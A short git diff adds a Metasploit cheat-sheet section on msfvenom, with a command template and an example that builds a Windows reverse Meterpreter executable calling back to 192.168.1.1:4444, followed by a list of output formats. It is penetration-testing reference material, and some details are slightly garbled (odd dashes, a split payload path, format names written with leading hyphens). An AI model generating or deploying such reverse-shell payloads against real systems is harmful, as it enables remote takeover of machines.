@@ -77,4 +77,30 @@ msf > run
 ```
 ***
 
+# msfvenom :
 
+msfvenom this is tool can be used to generate Metasploit payloads as standalone files and optionally encode them. This tool replaces `msfpayload` and `msfencode` tools. Run with ‘'-l payloads’ to get a list of payloads.
+
+```
+$ msfvenom –p [PayloadPath]
+–f [FormatType]
+LHOST=[LocalHost (if reverse conn.)]
+LPORT=[LocalPort]
+```
+
+
+- ##### Example: Reverse Meterpreter payload as an executable and redirected into a file:
+
+```
+$ msfvenom -p windows/meterpreter/
+reverse_tcp -f exe LHOST=192.168.1.1
+LPORT=4444 > met.exe
+```
+
+- [ ] - Format Options (specified with –f) --help-formats – List available output formats
+
+- `-exe` – Executable
+- `-pl` – Perl
+- `-rb` – Ruby
+- `-raw` – Raw shellcode
+- `-c` – C code
